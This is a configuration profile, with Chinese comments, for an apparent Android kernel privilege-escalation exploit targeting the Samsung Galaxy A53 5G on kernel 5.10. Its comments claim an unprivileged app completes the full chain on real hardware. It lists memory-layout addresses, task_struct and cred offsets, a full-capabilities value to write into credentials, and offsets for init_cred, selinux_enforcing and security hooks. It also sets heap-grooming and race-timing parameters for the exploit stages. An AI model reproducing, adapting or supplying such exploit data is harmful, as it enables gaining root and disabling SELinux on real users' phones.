# Galaxy A53 5G (SM-A536E) — A536EXXSMGZE2 / Exynos 1280 (s5e8825)
# Kernel 5.10.237-android12-9-31999025-abA536EXXSMGZE2, CONFIG_ARM64_VA_BITS=39,
# _text = 0xffffffc008000000. Android 16 / SDK 36.
#
# 地址布局走编译期开关 GHOSTLOCK_TARGET_A53_5_10（见 kernel/target_constants.hpp）：
# VA_BITS=39 的 PAGE_OFFSET = 0xffffffc000000000，与 6.x 的 48-bit 布局不同，
# 不能用默认那套 profile 二进制。
#
# kernel_phys_load 必须显式填写：detect_target_soc() 只识别
# google/tensor / mediatek/mtk / xring，Samsung Exynos 命中不了任何分支，
# 会落到 Qcom 兜底 0xa8000000 —— 对本 SoC 是错的。
# 0x80000000 来自 /proc/device-tree/memory@80000000 的 base（DT 节点名编码基址），
# 并与 Image header 的 text_offset = 0 一致（Image 加载在 memstart_addr + 0）。
# 所有数值必须是十进制。typesafe-config 1.4.3 把 `0x80000000` 解析成 String
# 而不是 Number，buildTree() 会静默丢弃非 Number/Map/null 的键，于是
# kernel_phys_load 会从高级编辑器的字段树中消失而不报任何错。

release = "5.10.237-android12-9-31999025-abA536EXXSMGZE2"
schema_version = 1
kernel_major = 5
# A53 的未特权 app 域可完成全链（上游 payload 已在 SM-A536E 上真机验证），
# 故不需要 Shizuku 路径。
recommend_shizuku = 0
kernel_phys_load = 2147483648
# DRAM 基址 / PHYS_OFFSET = memstart_addr，与 kernel_phys_load 同值。
# 缺省已是 P0_PHYS_OFFSET（0x80000000），此处显式写出以免未来默认值变动。
kernel_phys_offset = 2147483648

# 仅采用 select_stack 路由：5.10 无 multicast_waiter 的 handoff_tree，
# route/component_catalog.hpp 声明的三条路由中此条最简。
route {
  select_stack {
    # 取自真机 profile（select_stack.glk）的实测值，不是推算值。
    waiter_shift = 14
  }
}
fallback {
  to = "none"
}

# KernelSnitch：mm_struct SLUB 0x3c0（order-3），4 次 futex 碰撞。
kernelsnitch {
  mm_struct_sz = 960
  collisions = 4
}

# task_struct —— 由设备自身 /proc/config.gz 编译的 probe 导出，并与直接读
# 二进制得到的 4 个偏移（cred/real_cred/pi_lock/pi_blocked_on）逐一吻合。
# 注意 thread_info 为 0x30 字节（SVE build），不可套用上游 sched.h。
task_struct {
  prio                 = 132
  normal_prio          = 140
  sched_task_group     = 0
  pi_lock              = 2156
  pi_waiters           = 2176
  pi_top_task          = 2192
  pi_blocked_on        = 2200
  pid                  = 1480
  tgid                 = 1484
  atomic_flags         = 68
  real_cred            = 1912
  cred                 = 1920
  comm                 = 1936
  tasks                = 1224
  seccomp              = 2120
}

# cred —— sizeof(cred) = 0xa8。caps_value 是 41-bit CAP_FULL_SET，
# 不是 -1：init_cred 里 cap_permitted/effective/bset = 0x000001ffffffffff。
cred {
  copy_size      = 116
  usage_value    = 1
  caps_offset    = 48
  caps_count     = 5
  caps_value     = 2199023255551
  ref_count      = 0
  ref0_offset    = 0
  ref1_offset    = 0
  ref2_offset    = 0
  ref3_offset    = 0
  ref0_image     = 0
  ref1_image     = 0
  ref2_image     = 0
  ref3_image     = 0
}

# 内核符号偏移（相对 _text = 0xffffffc008000000）。
offset {
  init_task              = 31513856
  init_cred              = 29433888
  empty_zero_page        = 34066432
  root_task_group        = 34087040
  selinux_enforcing      = 35511144
  selinux_blob_sizes     = 28626592
  security_hook_heads    = 28624904
  slide_nfulnl_logger    = 31462256
  slide_loggers_0_1      = 31462056
  slide_boot_id          = 36184329
}

# 执行调优。与上游 5.15 profile 同量级；race 窗口放宽到 300s，因为 A53
# 冷机下 KernelSnitch reclaim 需要更长的 settle。
execution {
  recommended_cpus {
    main = 0
    consumer = 1
  }
  heap {
    prepare_max_attempts = 4
    prepare_timeout_ms = 240000
    kernelsnitch_timeout_ms = 60000
  }
  race {
    route_wait_ms = 1000
    route_done_timeout_ms = 300000
    setup_settle_us = 50000
    state_poll_interval_us = 1000
  }
  stages {
    w1_attempts = 15
    w1_settle_us = 100000
    w1_scratch_repair_attempts = 3
    w2_attempts = 15
    w2_settle_us = 100000
    w3_chain_rounds = 3
    w3_attempts = 6
    w3_settle_us = 50000
  }
  handoff {
    pre_dispatch_settle_ms = 2000
    module_poll_attempts = 30
    module_poll_interval_ms = 100
    enforce_poll_attempts = 200
    enforce_poll_interval_ms = 100
  }
  consumer {
    max_calls = 1
    burst_calls = 1
  }
}